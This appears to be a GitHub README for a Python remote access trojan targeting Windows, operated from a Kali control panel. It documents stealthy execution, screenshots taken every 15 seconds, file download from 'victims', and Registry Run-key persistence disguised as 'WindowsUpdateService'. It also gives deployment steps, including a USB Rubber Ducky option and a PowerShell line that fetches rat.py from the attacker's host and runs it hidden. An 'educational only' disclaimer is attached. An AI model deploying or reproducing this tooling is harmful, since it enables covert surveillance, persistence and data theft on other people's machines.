# 🕵️ RAT - Remote Administration Toolkit

<div align="center">

![Python](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge&logo=python)
![Windows](https://img.shields.io/badge/Windows-Target-0078D6?style=for-the-badge&logo=windows)
![Kali](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux)
![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)

**A stealthy, multi-featured Remote Administration Tool for Windows systems**

</div>

---

## ⚠️ LEGAL DISCLAIMER

> **This tool is for EDUCATIONAL PURPOSES ONLY.**
> - Only use on systems you own or have written permission to test
> - Unauthorized access is illegal and unethical
> - The author assumes no responsibility for misuse

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🖥️ **Command Execution** | Run any Windows command remotely |
| 📸 **Auto Screenshots** | Captures every 15 seconds |
| 🎯 **Manual Screenshots** | On-demand capture via `ss` command |
| 📁 **File Download** | Download files from target system |
| 🔄 **Persistence** | Survives system reboots via Registry |
| 🙈 **Stealth Mode** | No console windows visible |
| 📶 **Auto-Reconnect** | Survives connection drops |

---

## 🚀 Quick Setup

### Prerequisites

**Kali Linux (Control Server):**

sudo apt update
sudo apt install python3 python3-pip

Windows Target:

bash
pip install pyautogui pillow
Configuration
1. Set your Kali IP in rat.py and code.py:

python
KALI_IP = "192.168.1.100"  # CHANGE THIS
2. Optional settings:

python
# rat.py
KALI_PORT = 4444
SCREENSHOT_INTERVAL = 15

# kali_control.py
SAVE_FOLDER = "screenshots"
🎮 How to Use
Step 1: Start Control Panel (Kali)
bash
python3 kali_control.py
Output:

text
==================================================
  🎯 RAT Control Panel Active
  📁 Screenshots saved to: screenshots/
==================================================

[*] 🚀 Listening on 0.0.0.0:4444
[*] ⏳ Waiting for victim connection...
Step 2: Deploy to Windows
Option A: USB Rubber Ducky

python
# Run code.py on the target system
# It opens PowerShell, downloads and executes rat.py
Option B: Manual PowerShell

powershell
mkdir -Force C:\Temp\RAT
cd C:\Temp\RAT
Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8080/rat.py" -OutFile rat.py
pythonw.exe rat.py
Step 3: Control the Target
text
Command> whoami
✅ RAT ONLINE - DESKTOP-ABC - johndoe

Command> ipconfig
📡 IPv4 Address: 192.168.1.50

Command> ss
📸 Screenshot saved!

Command> download C:\secret.txt
📁 File downloaded (45.2 KB)

Command> exit
👋 Disconnected
📋 Commands
Command	Description	Example
whoami	Current user	whoami
ipconfig	Network info	ipconfig
systeminfo	System details	systeminfo
dir / ls	List directory	dir
cd <path>	Change directory	cd C:\Users
ss	Take screenshot	ss
download <file>	Download file	download C:\flag.txt
exit / quit	Disconnect	exit
🛡️ Persistence
The RAT adds itself to Windows Registry:

registry
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Key: WindowsUpdateService
Value: "pythonw.exe C:\Temp\RAT\rat.py"
📁 File Structure
text
rat-project/
├── rat.py              # Client payload
├── kali_control.py     # Control panel
├── code.py             # Deployment script
├── README.md           # This file
└── screenshots/        # Captured screenshots
🔧 Technical Details
Protocol:

text
[MARKER: 1 byte] [LENGTH: 4 bytes] [DATA: variable]
Markers:

\x01 - Text output

\x02 - Screenshot

\x03 - File download

❓ Troubleshooting
Issue	Solution
No connection	Check firewall: sudo ufw allow 4444
Wrong IP	Verify KALI_IP matches your Kali IP
Screenshots not saving	Check write permissions
Module not found	pip install pyautogui pillow
🛠️ Customization
Change screenshot quality:

python
ss.save(buf, format="JPEG", quality=50)  # Default: 20
Change port:

python
KALI_PORT = 1337  # Default: 4444
Change screenshot interval:

python
SCREENSHOT_INTERVAL = 30  # Default: 15 seconds
📚 Resources
Python Socket Programming

PyAutoGUI Documentation

Windows Commands

🤝 Contributing
Fork the repo

Create a feature branch

Submit a pull request

📝 License
This project is for educational purposes only.

✅ Do	❌ Don't
Learn security	Use maliciously
Test on own systems	Attack others
Participate in CTFs	Violate laws
<div align="center">
Made with ❤️ for Security Education

⭐ Star this repo if you find it useful!

</div> ```
